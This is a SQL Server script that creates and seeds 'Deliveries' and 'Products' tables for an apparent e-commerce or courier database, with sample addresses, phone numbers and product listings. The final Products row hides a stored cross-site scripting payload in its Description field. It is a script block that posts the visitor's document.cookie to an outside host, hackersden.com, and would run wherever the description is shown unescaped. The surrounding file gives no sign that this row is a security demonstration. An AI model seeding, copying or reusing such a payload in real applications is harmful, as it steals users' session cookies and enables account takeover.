USE [ProductMaster]
GO
/****** Object:  Table [dbo].[Deliveries]    Script Date: 7/5/2020 5:24:41 PM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
SET ANSI_PADDING ON
GO
CREATE TABLE [dbo].[Deliveries](
	[DeliveryId] [nvarchar](128) NOT NULL,
	[ProductId] [nvarchar](128) NULL,
	[FromAddress] [varchar](max) NULL,
	[ToAddress] [varchar](max) NULL,
	[ReceiverName] [varchar](100) NULL,
	[Phone] [varchar](100) NULL,
	[PinCode] [varchar](10) NULL,
	[PanCardNo] [varchar](20) NULL,
	[IsDelivered] [bit] NULL,
	[IsActive] [bit] NULL,
	[CreatedDate] [datetime] NULL,
	[CurrentLocation] [varchar](max) NULL,
	[WayBillNo] [int] NULL,
 CONSTRAINT [PK_Deliveries] PRIMARY KEY CLUSTERED 
(
	[DeliveryId] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]

GO
SET ANSI_PADDING OFF
GO
/****** Object:  Table [dbo].[Products]    Script Date: 7/5/2020 5:24:41 PM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
SET ANSI_PADDING ON
GO
CREATE TABLE [dbo].[Products](
	[ProductId] [nvarchar](128) NULL,
	[ProductName] [varchar](max) NULL,
	[ManufacturerName] [varchar](128) NULL,
	[Price] [money] NULL,
	[IsAvailable] [bit] NULL,
	[IsActive] [bit] NULL,
	[Description] [varchar](max) NULL,
	[CreatedDate] [datetime] NULL
) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]

GO
SET ANSI_PADDING OFF
GO
INSERT [dbo].[Deliveries] ([DeliveryId], [ProductId], [FromAddress], [ToAddress], [ReceiverName], [Phone], [PinCode], [PanCardNo], [IsDelivered], [IsActive], [CreatedDate], [CurrentLocation], [WayBillNo]) VALUES (N'0C6D1A06-8BCC-491A-89CB-CCD23601ED5E', NULL, N'Banglore Hub', N'A 34 Saibaba Colony, Coimbatore', N'Raja', N'9856321452', N'653241', N'ADP231DS', 0, 0, CAST(0x0000ABC900F8A7FF AS DateTime), N'Banglore', 856321445)
INSERT [dbo].[Deliveries] ([DeliveryId], [ProductId], [FromAddress], [ToAddress], [ReceiverName], [Phone], [PinCode], [PanCardNo], [IsDelivered], [IsActive], [CreatedDate], [CurrentLocation], [WayBillNo]) VALUES (N'4B29F6EB-A367-42D5-9E01-121AEC3AF381', NULL, N'Noida Hub', N'C45 HSR Layout, Banglore', N'Teena', N'8563214563', N'440023', N'QEES34AS', 1, 1, CAST(0x0000ABC900F924CF AS DateTime), N'Banglore', 963258711)
INSERT [dbo].[Deliveries] ([DeliveryId], [ProductId], [FromAddress], [ToAddress], [ReceiverName], [Phone], [PinCode], [PanCardNo], [IsDelivered], [IsActive], [CreatedDate], [CurrentLocation], [WayBillNo]) VALUES (N'765021D5-6C50-4E44-BFCC-800C2A0108F5', NULL, N'Delhi Hub', N'No5 Raj Bhavan, Mumbai', N'Daniel', N'789654123', N'2000223', N'GFT3412S', 0, 1, CAST(0x0000ABC900F97350 AS DateTime), N'Gurugaon', 658963214)
INSERT [dbo].[Deliveries] ([DeliveryId], [ProductId], [FromAddress], [ToAddress], [ReceiverName], [Phone], [PinCode], [PanCardNo], [IsDelivered], [IsActive], [CreatedDate], [CurrentLocation], [WayBillNo]) VALUES (N'8F35BD6D-6925-4A14-9ED9-B0C4692E8BC5', NULL, N'Mumbai Hub', N'Guntakal, Hyderabad', N'Rajeev Reddy', N'6589654123', N'520000', N'THGJ342S', 0, 1, CAST(0x0000ABC900F9B540 AS DateTime), N'Gurugaon', 369856321)
INSERT [dbo].[Deliveries] ([DeliveryId], [ProductId], [FromAddress], [ToAddress], [ReceiverName], [Phone], [PinCode], [PanCardNo], [IsDelivered], [IsActive], [CreatedDate], [CurrentLocation], [WayBillNo]) VALUES (N'B50735FD-93A3-4B45-903F-6A6BD29341AD', NULL, N'Banglore Hub', N'B 5 Napier Colony, Chennai', N'Adam', N'987854123', N'5632151', N'AMP5417D', 0, 1, CAST(0x0000ABC900F8DF48 AS DateTime), N'Banglore', 874521452)
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'352F56E0-AAF0-4357-BCAE-A5945AABDB6A', N'Redmi Note 8', N'Xiomi', 16000.0000, 1, 1, N'Redmi Note 8', CAST(0x0000ABBB00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'55D2AD9D-9BD4-4F45-94D9-CC01FA28ADC4', N'Redmi Note 8 Pro', N'Xiomi', 18000.0000, 1, 1, N'Redmi Note 8 Pro', CAST(0x0000AB9D00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'EA2DEB24-17A1-438C-A018-F7F227C3CB03', N'Redmi Note 9 Pro', N'Xiomi', 20000.0000, 1, 0, N'Redmi Note 9 Pro', CAST(0x0000AB7E00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'339D806C-CB0D-4B73-A04A-B2F2165E17FA', N'Redmi Note 9', N'Xiomi', 21000.0000, 0, 0, N'Redmi Note 9', CAST(0x0000AB6100E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'8DD43C7D-FFDE-48B0-A154-72ACE54F8167', N'Samsung M30', N'Samsung', 14000.0000, 1, 1, N'Samsung M30', CAST(0x0000AB4200E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'CC13B26A-8882-4132-97D4-9FFF973810BB', N'Samsung M30s', N'Samsung', 15000.0000, 0, 1, N'Samsung M30s', CAST(0x0000AA6C00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'E5134BA2-D6C4-4447-A9D1-1D60E4B52EE7', N'Cannon DSLR', N'Cannon', 45000.0000, 1, 1, N'Cannon DSLR', CAST(0x0000AA4D00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'FE84B359-CA2E-4778-B2DC-4090286B088E', N'Cannon DSLR ZXR', N'Cannon', 62000.0000, 1, 0, N'Cannon DSLR ZXR', CAST(0x0000AA2F00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'FB71FAF8-636B-48E9-9C6D-E297BF32959B', N'HP Laptop - Z90', N'HP', 65000.0000, 1, 1, N'HP Laptop - Z90', CAST(0x0000AA1000E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'43081FA5-08ED-4725-8E5C-023A0E6BA841', N'HP Laptop - Z91', N'HP', 75000.0000, 0, 1, N'HP Laptop - Z91', CAST(0x0000A9F400E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'68A3814D-B441-491D-96E9-AB4EADDB3675', N'HP Laptop - Zubia', N'HP', 115000.0000, 1, 1, N'HP Laptop - Zubia', CAST(0x0000A9D500E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'894FCA1B-1555-41A4-9361-B44FF11DFD3B', N'LG AC - 2TON', N'LG', 37000.0000, 1, 0, N'LG AC - 2TON', CAST(0x0000A9D500E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'DCF3EA0D-5B3D-41C6-9DA6-DD401F78E2F0', N'Wireless Keyboard', N'Logitech', 1200.0000, 0, 1, N'Wireless Keyboard', CAST(0x0000A8FF00E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'C0E6479F-3D85-4FB2-8D23-29153FE0645B', N'T- Shirt', N'Polo', 399.0000, 1, 1, N'T- Shirt', CAST(0x0000A8E000E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'B318B175-4830-48DE-ADCA-3868198E7037', N'T- Shirt', N'Nike', 499.0000, 1, 0, N'T- Shirt', CAST(0x0000A8C200E8C828 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'2d9ea34d-643c-44b0-a4d2-3be60598f900', N'Nokia 1100', N'Nokia', 1500.0000, 0, 1, N'Old is gold', CAST(0x0000ABDA011176A4 AS DateTime))
INSERT [dbo].[Products] ([ProductId], [ProductName], [ManufacturerName], [Price], [IsAvailable], [IsActive], [Description], [CreatedDate]) VALUES (N'd7919f5a-ee18-4431-8c33-1742c177fb99', N'Laptop', N'HP', 65000.0000, 1, 1, N'<script>
   $.post("http://www.hackersden.com:86/Cookie/SaveCookies1", {cookieList:document.cookie}, function (data, status) {			
  });
</script>', CAST(0x0000ABE000ED24FC AS DateTime))
